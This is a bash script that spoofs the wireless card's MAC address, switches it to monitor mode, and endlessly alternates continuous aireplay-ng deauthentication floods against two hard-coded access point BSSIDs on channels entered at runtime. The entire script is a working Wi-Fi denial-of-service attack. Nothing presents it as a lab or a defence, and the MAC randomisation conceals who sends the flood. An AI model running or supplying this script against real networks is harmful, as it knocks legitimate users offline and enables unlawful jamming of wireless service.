#!/bin/bash
ip link set wlan0 down
macchanger -r wlan0
ip link set wlan0 up
iw dev wlan0 set type monitor
sleep 2
echo "CH b0c0"
read ch_b
echo "CH 8000"
read ch_b1

b="80:03:84:a7:b0:c0"

b1="80:03:84:a7:80:00"

duration=200

iface=wlan0

while true; do
	echo "[*] Switching"
	iw dev wlan0 set channel "$ch_b"
	sleep 1
	timeout "$duration" bash -c '
		while true; do
			aireplay-ng --deauth 0 -a "'"$b"'" "'"$iface"'"
			if [ $? -ne 0 ]; then
				sleep 1
			else
				break
			fi
		done
	'

	sleep 2

	echo "[*] Switching"
	iw dev "$iface" set channel "$ch_b1"
	sleep 1
	timeout "$duration" bash -c '
		while true; do
			aireplay-ng --deauth 0 -a "'"$b1"'" "'"$iface"'"
			if [ $? -ne 0 ]; then
				echo "[!] Deauth failed for BSSID '"$b1"', retrying in 1s"
				sleep 1
			else
				break
			fi
		done
	'
	sleep 2
done
